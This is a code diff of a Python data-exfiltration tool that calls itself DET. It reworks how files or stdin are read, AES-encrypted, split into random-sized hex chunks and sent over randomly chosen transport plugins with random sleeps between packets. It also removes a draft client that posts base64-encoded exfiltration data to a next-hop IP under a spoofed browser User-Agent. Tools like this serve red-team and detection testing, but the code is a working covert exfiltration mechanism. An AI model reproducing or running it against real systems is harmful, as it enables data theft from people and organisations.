@@ -273,24 +273,55 @@ class ExfiltrateFile(threading.Thread):
         self.daemon = True
 
     def run(self):
-        packet_index = -1
-        plugin_name, plugin_send_function = self.exfiltrate.get_random_plugin()
+        # checksum
+        if self.file_to_send == 'stdin':
+            file_content = sys.stdin.read()
+            buf = StringIO(file_content)
+            e = StringIO(file_content)
+        else:
+            with open(self.file_to_send, 'rb') as f:
+                file_content = f.read()
+            buf = StringIO(file_content)
+            e = StringIO(file_content)
+        self.checksum = md5(buf)
+        del file_content
 
-        data, f = get_next_data(self.file_to_send, packet_index, plugin_name, None, self.exfiltrate.KEY, self.jobid)
+        # registering packet
+        plugin_name, plugin_send_function = self.exfiltrate.get_random_plugin()
+        ok("Using {0} as transport method".format(plugin_name))
+
+        warning("[!] Registering packet for the file")
+        data = "%s|!|%s|!|REGISTER|!|%s" % (
+            self.jobid, os.path.basename(self.file_to_send), self.checksum)
         plugin_send_function(data)
-        packet_index += 1
-        time_to_sleep = uniform(0, MAX_TIME_SLEEP)
+
+        time_to_sleep = randint(1, MAX_TIME_SLEEP)
         info("Sleeping for %s seconds" % time_to_sleep)
         time.sleep(time_to_sleep)
 
+        # sending the data
+        f = tempfile.SpooledTemporaryFile()
+        data = e.read()
+        if COMPRESSION:
+            data = compress(data)
+        f.write(aes_encrypt(data, self.exfiltrate.KEY))
+        f.seek(0)
+        e.close()
+
+        packet_index = 0
         while (True):
-            data, _ = get_next_data(self.file_to_send, packet_index, plugin_name, f, self.exfiltrate.KEY, self.jobid)
-            if data == None:
+            data_file = f.read(randint(MIN_BYTES_READ, MAX_BYTES_READ)).encode('hex')
+            if not data_file:
                 break
             plugin_name, plugin_send_function = self.exfiltrate.get_random_plugin()
+            ok("Using {0} as transport method".format(plugin_name))
+            # info("Sending %s bytes packet" % len(data_file))
+
+            data = "%s|!|%s|!|%s" % (self.jobid, packet_index, data_file)
             plugin_send_function(data)
             packet_index = packet_index + 1
-            time_to_sleep = uniform(0, MAX_TIME_SLEEP)
+
+            time_to_sleep = randint(1, MAX_TIME_SLEEP)
             display_message("Sleeping for %s seconds" % time_to_sleep)
             time.sleep(time_to_sleep)
 
@@ -302,76 +333,10 @@ class ExfiltrateFile(threading.Thread):
         f.close()
         sys.exit(0)
 
-def get_next_data(file_to_send, packet_index, plugin_name, f, KEY, jobid):
-    if packet_index == -1:
-        # register!!
-        # checksum
-        if file_to_send == 'stdin':
-            file_content = sys.stdin.read()
-            buf = StringIO(file_content)
-            e = StringIO(file_content)
-        else:
-            with open(file_to_send, 'rb') as f:
-                file_content = f.read()
-            buf = StringIO(file_content)
-            e = StringIO(file_content)
-        checksum = md5(buf)
-        del file_content
-
-        # registering packet
-        ok("Using {0} as transport method".format(plugin_name))
-
-        warning("[!] Registering packet for the file")
-        data1 = "%s|!|%s|!|REGISTER|!|%s" % (
-            jobid, os.path.basename(file_to_send), checksum)
-
-        # sending the data
-        f = tempfile.SpooledTemporaryFile()
-        data = e.read()
-        if COMPRESSION:
-            data = compress(data)
-        f.write(aes_encrypt(data, KEY))
-        f.seek(0)
-        e.close()
-        return data1,f
-    else:
-        # return actual data
-        data_file = f.read(randint(MIN_BYTES_READ, MAX_BYTES_READ)).encode('hex')
-        if not data_file:
-            return None, None
-        ok("Using {0} as transport method".format(plugin_name))
-        # info("Sending %s bytes packet" % len(data_file))
-        data = "%s|!|%s|!|%s" % (jobid, packet_index, data_file)
-        return data,None
-
-
 def signal_handler(bla, frame):
     global threads
     warning('Killing DET and its subprocesses')
     os.kill(os.getpid(), signal.SIGKILL)
-
-## TODO: this is how the main MIMIR component will request exfil components
-def mimir_DET_client(path, file_to_exfil):
-    data = {}
-    data['path_data'] = {}
-    data['path_data']['index'] = 1
-    ## note: each path is a list of dict, where each dict has "ip" and "port" keys
-    data['path_data']['path'] = path
-    data['path_data']['file_to_end'] = file_to_exfil
-    data_to_send = {'data': base64.b64encode(data)}
-
-    next_ip = data['path_data'][1]['ip']
-    next_port = data['path_data'][1]['port']
-    target = "http://{}:{}".format(next_ip, next_port)
-    headers = requests.utils.default_headers()
-    headers.update({'User-Agent': "Mozilla/5.0 (X11; Linux x86_64; rv:52.0) Gecko/20100101 Firefox/52.0"})
-    requests.post(target, data=data_to_send, headers=headers)
-
-    ## TODO: step (1) : consruct request for more of the data
-        ## okay, sketched above...
-    ## TODO: step (2) : be able to decipher the end information somehow...
-        ## added below...
-    pass
 
 def main():
     global MAX_TIME_SLEEP, MIN_TIME_SLEEP, KEY, MAX_BYTES_READ, MIN_BYTES_READ, COMPRESSION
@@ -394,10 +359,6 @@ def main():
                         dest="listen", default=False, help="Server mode")
     listenMode.add_argument('-Z', action="store_true",
                         dest="proxy", default=False, help="Proxy mode")
-    listenMode.add_argument('-M', action="store_true",
-                            dest="microservice", default=False, help="Special Model for MS applicatinos")
-    listenMode.add_argument('-LM', action="store_true",
-                            dest="list_microservice", default=False, help="Special Listen Model for MS applications")
     results = parser.parse_args()
 
     if (results.config is None):
@@ -432,6 +393,7 @@ def main():
             thread.daemon = True
             thread.start()
             threads.append(thread)
+    '''
     elif results.microservice:
         plugins = app.get_plugins()
         plugin = plugins[0]
@@ -446,6 +408,7 @@ def main():
         threads.append(thread)
         thread.daemon = True
         thread.start()
+    '''
     # EXFIL mode
     else:
         if (results.folder is None and results.file is None):
